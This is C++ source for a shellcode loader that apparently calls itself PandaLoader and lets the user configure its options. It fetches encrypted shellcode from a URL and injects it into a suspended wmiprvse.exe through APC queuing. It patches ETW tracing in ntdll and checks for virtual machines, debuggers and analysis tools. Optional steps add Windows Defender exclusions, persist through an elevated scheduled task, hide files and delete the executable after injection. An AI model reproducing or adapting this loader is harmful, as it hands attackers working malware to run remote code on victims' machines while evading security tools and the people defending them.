#include <windows.h>
#include <wininet.h>
#include <vector>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <Shlwapi.h>
#include "obfusheader.h"
#include <Windows.h>
#include <cstring> 
#include <algorithm>
#include <psapi.h>
#include <TlHelp32.h>
#pragma comment(lib, "Wininet.lib")
#define ENABLE_ADMIN 0 // Mandatory when adding persistence and WD exclusions
#define ADD_EXCLUSION 0 // Optional (Add Windows Defender Exclusions)
#define MELT 0 // Deletes the payload after injection
#define ENABLE_STARTUP 0 // Persist on the machine after reboot
#define SLEEP_DELAY 0   // Might help in bypassing some AVs
#define ENABLE_ANTIVM 0  // Set to 1 to enable anti-VM checks, 0 to disable
#define STARTUP_ENTRYNAME OBF("PERSISTENCE_REPLACE_ME") // Randomize these 
#define DIRECTORY_NAME OBF("DIRECTORY_REPLACE_ME") // Randomize these 
#define FILENAME OBF("FILENAME_REPLACE_ME") // Randomize these 
#define HIDE_DIRECTORY 0 // Optional
#define XOR_DECRYPTION_KEY OBF("XOR_KEY_REPLACE_ME") // The decryption key for your shellcode
#define SHELLCODE_URL OBF(L"SHELLCODE_URL_REPLACE_ME") // Replace SHELLCODE_URL_REPLACE_ME with your shellcode link , NOTE x64 shellcode only.
#define SINGLE_INSTANCE 1 // MUTEX 

typedef BOOL(WINAPI* WriteProcessMemoryFunc)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
WriteProcessMemoryFunc pwProcmem = (WriteProcessMemoryFunc)GetProcAddress(GetModuleHandleA(OBF("kernel32.dll")), OBF("WriteProcessMemory"));
typedef BOOL(WINAPI* QueueUserAPCFunc)(PAPCFUNC, HANDLE, ULONG_PTR);
QueueUserAPCFunc pwQueueUserAPC = (QueueUserAPCFunc)GetProcAddress(GetModuleHandleA(OBF("kernel32.dll")), OBF("QueueUserAPC"));
typedef BOOL(WINAPI* CreateProcessAFunc)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
CreateProcessAFunc pwCreateProcess = (CreateProcessAFunc)GetProcAddress(GetModuleHandleA(OBF("kernel32.dll")), OBF("CreateProcessA"));
typedef LPVOID(WINAPI* VirtualAllocExFunc)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
VirtualAllocExFunc pwVirtualAllocEx = (VirtualAllocExFunc)GetProcAddress(GetModuleHandleA(OBF("kernel32.dll")), OBF("VirtualAllocEx"));
typedef BOOL(WINAPI* VirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD);
VirtualProtectFunc pwVirtualProtect = (VirtualProtectFunc)GetProcAddress(GetModuleHandleA(OBF("kernel32.dll")), OBF("VirtualProtect"));
typedef BOOL(WINAPI* VirtualAllocExNumaFunc)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD, DWORD);
VirtualAllocExNumaFunc pwVirtualAllocExNuma = (VirtualAllocExNumaFunc)GetProcAddress(GetModuleHandleA(OBF("kernel32.dll")), OBF("VirtualAllocExNuma"));


BOOL ETWPATCH() {
    DWORD oldprotect = 0;
    const char* functions[] = { OBF("EtwEventWrite"), OBF("EtwEventWriteFull"), OBF("EtwEventWriteTransfer"), OBF("EtwRegister"), OBF("EtwRegisterTraceGuidsW"), OBF("EtwRegisterTraceGuidsA"), OBF("EtwSendMessage"), OBF("EtwEventWriteNoRegistration") };
    for (int i = 0; i < (sizeof(functions) / sizeof(functions[0])); i++) {
        void* pFunc = (void*)GetProcAddress(GetModuleHandleA(OBF("ntdll.dll")), functions[i]);
        if (!pFunc) continue;

        if (!VirtualProtect(pFunc, 4096, PAGE_EXECUTE_READWRITE, &oldprotect)) return FALSE;
#ifdef _WIN64
        memcpy(pFunc, "\x48\x33\xc0\xc3", 4); // xor rax, rax; ret
#else
        memcpy(pFunc, "\x33\xc0\xc2\x14\x00", 5); // xor eax, eax; ret 14
#endif
        VirtualProtect(pFunc, 4096, oldprotect, &oldprotect);
        FlushInstructionCache(GetCurrentProcess(), pFunc, 4096);
    }
    return TRUE;
}

// Check if there are fewer than 100 processes
BOOL CheckMachineProcesses() {
    DWORD adwProcesses[1024], dwReturnLen = 0;
    if (EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen)) {
        DWORD dwNmbrOfPids = dwReturnLen / sizeof(DWORD);
        if (dwNmbrOfPids < 100) {
            return TRUE;
        }
    }
    return FALSE;
}

BOOL FileExists(const std::wstring& filePath) {
    WIN32_FIND_DATAW findFileData;
    HANDLE hFind = FindFirstFileW(filePath.c_str(), &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return false;
    }
    FindClose(hFind);
    return true;
}

BOOL DirectoryExists(const std::wstring& dirPath) {
    DWORD fileAttrib = GetFileAttributesW(dirPath.c_str());
    return (fileAttrib != INVALID_FILE_ATTRIBUTES && (fileAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

BOOL VMArtifactsDetect() {
    std::vector<std::wstring> badFileNames = {
        OBF(L"vboxmouse.sys"),
        OBF(L"vboxguest.sys"),
        OBF(L"vboxsf.sys"),
        OBF(L"vboxvideo.sys"),
        OBF(L"vmmouse.sys"),
        OBF(L"vboxogl.dll")
    };
    std::vector<std::wstring> badDirs = {
        OBF(L"C:\\Program Files\\VMware"),
        OBF(L"C:\\Program Files\\oracle\\virtualbox guest additions")
    };
    DWORD bufferSize = GetEnvironmentVariableW(OBF(L"SystemRoot"), NULL, 0);
    if (bufferSize == 0) {
        return FALSE; 
    }
    std::wstring systemRoot(bufferSize, L'\0');
    if (GetEnvironmentVariableW(OBF(L"SystemRoot"), &systemRoot[0], bufferSize) == 0) {
        return FALSE; 
    }
    systemRoot.resize(bufferSize - 1);
    std::wstring system32Folder = systemRoot + OBF(L"\\System32\\*");
    WIN32_FIND_DATAW findFileData;
    HANDLE hFind = FindFirstFileW(system32Folder.c_str(), &findFileData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            std::wstring fileName = findFileData.cFileName;
            std::transform(fileName.begin(), fileName.end(), fileName.begin(), ::towlower);
            if (std::find(badFileNames.begin(), badFileNames.end(), fileName) != badFileNames.end()) {
                FindClose(hFind);
                return TRUE;
            }
        } while (FindNextFileW(hFind, &findFileData) != 0);
        FindClose(hFind);
    }
    for (const auto& badDir : badDirs) {
        if (DirectoryExists(badDir)) {
            return TRUE;
        }
    }
    return FALSE;
}

// Check for specific processes and other VM-related indicators
BOOL VMPROTECT() {
    std::vector<std::wstring> processNames = {
        OBF(L"autorunsc.exe"),
        OBF(L"binaryninja.exe"),
        OBF(L"dumpcap.exe"),
        OBF(L"die.exe"),
        OBF(L"autorunsc.exe"),
        OBF(L"joeboxserver.exe"),
        OBF(L"qga.exe"),
        OBF(L"qemu-ga"),
        OBF(L"sandman.exe"),
        OBF(L"sysmon.exe"),
        OBF(L"taskmgr.exe"),
        OBF(L"tcpdump.exe"),
        OBF(L"sniff_hit.exe"),
        OBF(L"vboxcontrol.exe"),
        OBF(L"vboxservice.exe"),
        OBF(L"vboxtray.exe"),
        OBF(L"vt-windows-event-stream.exe"),
        OBF(L"vmwaretray.exe"),
        OBF(L"vmwareuser.exe"),
        OBF(L"wireshark.exe"),
        OBF(L"windbg.exe"),
        OBF(L"xenservice.exe")
    };
    wchar_t localAppData[MAX_PATH];
    DWORD result = GetEnvironmentVariableW(OBF(L"LOCALAPPDATA"), localAppData, MAX_PATH);
    if (result > 0 && result < MAX_PATH) {
        std::wstring filePath = std::wstring(localAppData) + OBF(L"\\Temp\\JSAMSIProvider64.dll");
        if (GetFileAttributesW(filePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            return TRUE;
        }
    }
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe32 = { sizeof(PROCESSENTRY32W) };
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                for (const auto& processName : processNames) {
                    if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                        CloseHandle(hSnapshot);
                        return TRUE;
                    }
                }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }

    if (IsDebuggerPresent()) {
        return TRUE;
    }
    if (CheckMachineProcesses()) {
        return TRUE;
    }
    if (VMArtifactsDetect()) {
        return TRUE;
    }
    return FALSE;
}


BOOL GetPayloadFromUrl(LPCWSTR szUrl, std::vector<BYTE>& payload) {
    HINTERNET hInternet = InternetOpenW(OBF(L"PANDALOADER"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return FALSE;
    }
    HINTERNET hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (!hInternetFile) {
        InternetCloseHandle(hInternet);
        return FALSE;
    }
    DWORD bytesRead;
    BYTE buffer[4096];
    while (InternetReadFile(hInternetFile, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {
        payload.insert(payload.end(), buffer, buffer + bytesRead);
    }
    if (bytesRead == 0 && GetLastError() != ERROR_SUCCESS) {
        InternetCloseHandle(hInternetFile);
        InternetCloseHandle(hInternet);
        return FALSE;
    }
    InternetCloseHandle(hInternetFile);
    InternetCloseHandle(hInternet);
    return TRUE;
}

BOOL IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID administratorsGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &administratorsGroup)) {
        CheckTokenMembership(NULL, administratorsGroup, &isAdmin);
        FreeSid(administratorsGroup);
    }
    return isAdmin == TRUE;
}

std::string get_executable_path() {
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return std::string(buffer);
}

BOOL is_in_directory(const std::string& directoryName) {
    std::string current_path = get_executable_path();
    std::string::size_type pos = current_path.find(directoryName);
    return (pos != std::string::npos);
}

void delete_current_executable() {
    std::string current_path = get_executable_path();
    std::string command = std::string(OBF("/C choice /C Y /N /D Y /T 3 & Del \"")) + current_path + OBF("\"");
    ShellExecuteA(NULL, OBF("open"), OBF("cmd.exe"), command.c_str(), NULL, SW_HIDE);
}

std::string get_environment_variable(const std::string& varName) {
    char buffer[MAX_PATH];
    DWORD length = GetEnvironmentVariableA(varName.c_str(), buffer, MAX_PATH);
    if (length == 0 || length >= MAX_PATH) {
        return "";
    }
    return std::string(buffer);
}

void hide_directory_contents(const std::string& directoryPath) {
    WIN32_FIND_DATAA findFileData;
    HANDLE hFind = FindFirstFileA((directoryPath + "\\*").c_str(), &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }
    do {
        std::string fileName = findFileData.cFileName;
        if (fileName != "." && fileName != "..") {
            std::string fullPath = directoryPath + "\\" + fileName;
            SetFileAttributesA(fullPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                hide_directory_contents(fullPath);
            }
        }
    } while (FindNextFileA(hFind, &findFileData) != 0);
    FindClose(hFind);
}


BOOL create_scheduled_task(const std::string& taskName, const std::string& executablePath) {
    std::wstring longPath = std::wstring(executablePath.begin(), executablePath.end());
    std::string command = std::string(OBF("Register-ScheduledTask -TaskName \"")) + taskName +
        std::string(OBF("\" -Trigger (New-ScheduledTaskTrigger -AtLogon) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -RunOnlyIfNetworkAvailable -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0) -Action (New-ScheduledTaskAction -Execute '")) +
        std::string(longPath.begin(), longPath.end()) + std::string(OBF("') -Force -RunLevel Highest"));
    HINSTANCE hInst = ShellExecuteA(NULL, OBF("runas"), OBF("powershell.exe"), command.c_str(), NULL, SW_HIDE);
    return 0;
}

void setup_directory_and_copy_exe() {
    std::string systemDrive = get_environment_variable(OBF("SystemDrive"));
    std::string programData = get_environment_variable(OBF("ProgramData"));
    std::string destDir = systemDrive + OBF("\\ProgramData\\") + DIRECTORY_NAME;
    std::string fullFilename = std::string(FILENAME) + OBF(".exe");
    std::string destPath = destDir + "\\" + fullFilename;
    std::string exePath = get_executable_path();
    if (!CreateDirectoryA(destDir.c_str(), NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        return;
    }
    DeleteFileA(destPath.c_str());
    if (!CopyFileA(exePath.c_str(), destPath.c_str(), FALSE)) {
        return;
    }
    if (HIDE_DIRECTORY) {
        SetFileAttributesA(destDir.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        hide_directory_contents(destDir);
    }
    create_scheduled_task(STARTUP_ENTRYNAME, destPath);
}

void XORDecrypt(std::vector<BYTE>& data, const std::string& key) {
    size_t keyLength = key.size();
    for (size_t i = 0; i < data.size(); ++i) {
        data[i] ^= key[i % keyLength];
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
   std::string exePath = get_executable_path();
   std::wstring exePathW = std::wstring(exePath.begin(), exePath.end());
   ETWPATCH();
   if (ENABLE_ADMIN && !IsRunningAsAdmin()) {
        LPCWSTR powershellPath = OBF(L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
        WCHAR cmdLine[MAX_PATH];
#ifdef __MINGW32__
        // Use %S for MinGW, which expects a char* (narrow string) and handles it as wide.
        swprintf(cmdLine, MAX_PATH, OBF(L"Start-Process -FilePath '\"%S\"' -Verb runAs"), exePathW.data());
#else
        // Use %s for Visual Studio, which expects a wchar_t* (wide string).
       swprintf(cmdLine, MAX_PATH, OBF(L"Start-Process -FilePath '\"%s\"' -Verb runAs"), exePathW.data());
#endif
       ShellExecuteW(NULL, OBF(L"runas"), powershellPath, cmdLine, NULL, SW_HIDE);
       return 0;
    }
   if (SINGLE_INSTANCE) {
        HANDLE hMutex = CreateMutex(NULL, TRUE, OBF("PANDALOADER"));
        if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return 0;
    }
    }
#if ENABLE_ANTIVM
    if (VMPROTECT()) {
        ExitProcess(1);
    }
#endif
    if (SLEEP_DELAY) {
        Sleep(7000);
    }
    if (ADD_EXCLUSION) {
        ShellExecute(NULL, OBF("open"), OBF("powershell"), OBF("Add-MpPreference -ExclusionPath @($env:userprofile, $env:programdata) -Force"), NULL, SW_HIDE);
    }
    if (ENABLE_STARTUP && !is_in_directory(DIRECTORY_NAME)) {
        setup_directory_and_copy_exe();
    }
    std::vector<BYTE> payload;
    LPCWSTR url = SHELLCODE_URL;
    if (!GetPayloadFromUrl(url, payload)) {
        return 1;
    }
    std::string key = XOR_DECRYPTION_KEY;
    XORDecrypt(payload, key);
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    pwCreateProcess(OBF("C:\\Windows\\System32\\wbem\\wmiprvse.exe"), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    HANDLE victimProcess = pi.hProcess;
    HANDLE threadHandle = pi.hThread;
    LPVOID shellAddress = pwVirtualAllocEx(victimProcess, NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    PVOID pBaseAddress = nullptr;
    SIZE_T* bytesWritten = 0;
    pwProcmem(victimProcess, shellAddress, payload.data(), payload.size(), bytesWritten);
    pwVirtualProtect(shellAddress, payload.size(), PAGE_EXECUTE_READ, NULL);
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
    pwQueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
    ResumeThread(threadHandle);
    if (MELT && !is_in_directory(DIRECTORY_NAME)) {
        delete_current_executable();
    }
    return 0;
}
